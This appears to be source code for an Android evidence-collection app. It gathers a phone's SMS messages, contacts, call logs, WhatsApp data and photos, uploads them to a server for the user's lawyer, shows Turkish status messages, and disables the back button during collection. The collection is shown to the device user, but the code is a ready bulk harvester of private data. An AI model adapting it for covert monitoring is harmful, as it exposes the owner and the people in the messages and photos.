package com.safechild.agent

import android.os.Bundle
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

/**
 * Handles the actual data collection and upload process
 */
class CollectionActivity : AppCompatActivity() {

    private var collectionToken: String? = null
    private var clientNumber: String? = null
    private var grantedPermissions: List<String> = emptyList()

    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private lateinit var detailText: TextView
    private lateinit var progressText: TextView

    private lateinit var dataCollector: DataCollector
    private lateinit var apiService: ApiService

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_collection)

        collectionToken = intent.getStringExtra("COLLECTION_TOKEN")
        clientNumber = intent.getStringExtra("CLIENT_NUMBER")
        grantedPermissions = intent.getStringArrayListExtra("GRANTED_PERMISSIONS") ?: emptyList()

        setupUI()
        startCollection()
    }

    private fun setupUI() {
        progressBar = findViewById(R.id.progressBar)
        statusText = findViewById(R.id.statusText)
        detailText = findViewById(R.id.detailText)
        progressText = findViewById(R.id.progressText)

        statusText.text = "Veri Toplama Başlıyor..."
        progressBar.max = 100
        progressBar.progress = 0
    }

    private fun startCollection() {
        dataCollector = DataCollector(this)
        apiService = ApiService(this)

        lifecycleScope.launch {
            try {
                val collectedData = CollectedData()
                var progress = 0

                // Collect SMS
                if (grantedPermissions.contains("sms")) {
                    updateStatus("SMS mesajları toplanıyor...", 10)
                    collectedData.smsMessages = withContext(Dispatchers.IO) {
                        dataCollector.collectSMS()
                    }
                    updateDetail("${collectedData.smsMessages.size} SMS toplandı")
                }

                // Collect Contacts
                if (grantedPermissions.contains("contacts")) {
                    updateStatus("Rehber toplanıyor...", 25)
                    collectedData.contacts = withContext(Dispatchers.IO) {
                        dataCollector.collectContacts()
                    }
                    updateDetail("${collectedData.contacts.size} kişi toplandı")
                }

                // Collect Call Log
                if (grantedPermissions.contains("call_log")) {
                    updateStatus("Arama geçmişi toplanıyor...", 40)
                    collectedData.callLogs = withContext(Dispatchers.IO) {
                        dataCollector.collectCallLog()
                    }
                    updateDetail("${collectedData.callLogs.size} arama kaydı toplandı")
                }

                // Collect WhatsApp data
                if (grantedPermissions.contains("storage")) {
                    updateStatus("WhatsApp verileri toplanıyor...", 55)
                    collectedData.whatsappData = withContext(Dispatchers.IO) {
                        dataCollector.collectWhatsAppData()
                    }
                    updateDetail("WhatsApp verileri toplandı")

                    // Collect Photos
                    updateStatus("Fotoğraflar toplanıyor...", 70)
                    collectedData.mediaFiles = withContext(Dispatchers.IO) {
                        dataCollector.collectMediaFiles()
                    }
                    updateDetail("${collectedData.mediaFiles.size} medya dosyası bulundu")
                }

                // Upload data
                updateStatus("Veriler şifreleniyor ve yükleniyor...", 85)

                val uploadResult = withContext(Dispatchers.IO) {
                    apiService.uploadCollectedData(
                        token = collectionToken!!,
                        clientNumber = clientNumber ?: "unknown",
                        data = collectedData
                    )
                }

                if (uploadResult.success) {
                    updateStatus("Tamamlandı!", 100)
                    updateDetail("Tüm veriler başarıyla avukatınıza iletildi.")
                    showCompletionScreen()
                } else {
                    updateStatus("Hata!", 100)
                    updateDetail("Veriler yüklenirken bir hata oluştu: ${uploadResult.error}")
                }

            } catch (e: Exception) {
                updateStatus("Hata!", 0)
                updateDetail("Bir hata oluştu: ${e.message}")
            }
        }
    }

    private fun updateStatus(status: String, progress: Int) {
        runOnUiThread {
            statusText.text = status
            progressBar.progress = progress
            progressText.text = "$progress%"
        }
    }

    private fun updateDetail(detail: String) {
        runOnUiThread {
            detailText.text = detail
        }
    }

    private fun showCompletionScreen() {
        runOnUiThread {
            // Change UI to show completion
            findViewById<TextView>(R.id.completionTitle)?.apply {
                visibility = android.view.View.VISIBLE
                text = "İşlem Tamamlandı"
            }
            findViewById<TextView>(R.id.completionMessage)?.apply {
                visibility = android.view.View.VISIBLE
                text = """
                    Verileriniz başarıyla toplandı ve güvenli bir şekilde avukatınıza iletildi.

                    Bu uygulamayı artık kaldırabilirsiniz.

                    Teşekkür ederiz.
                """.trimIndent()
            }
        }
    }

    override fun onBackPressed() {
        // Prevent back during collection
        // super.onBackPressed()
    }
}

/**
 * Data class to hold all collected data
 */
data class CollectedData(
    var smsMessages: List<SmsMessage> = emptyList(),
    var contacts: List<Contact> = emptyList(),
    var callLogs: List<CallLogEntry> = emptyList(),
    var whatsappData: WhatsAppData? = null,
    var mediaFiles: List<MediaFile> = emptyList()
)

data class SmsMessage(
    val address: String,
    val body: String,
    val date: Long,
    val type: Int // 1=received, 2=sent
)

data class Contact(
    val name: String,
    val phoneNumbers: List<String>,
    val emails: List<String>
)

data class CallLogEntry(
    val number: String,
    val name: String?,
    val date: Long,
    val duration: Int,
    val type: Int // 1=incoming, 2=outgoing, 3=missed
)

data class WhatsAppData(
    val databasePath: String?,
    val mediaFiles: List<String>,
    val backupFound: Boolean
)

data class MediaFile(
    val path: String,
    val name: String,
    val size: Long,
    val mimeType: String,
    val dateAdded: Long
)
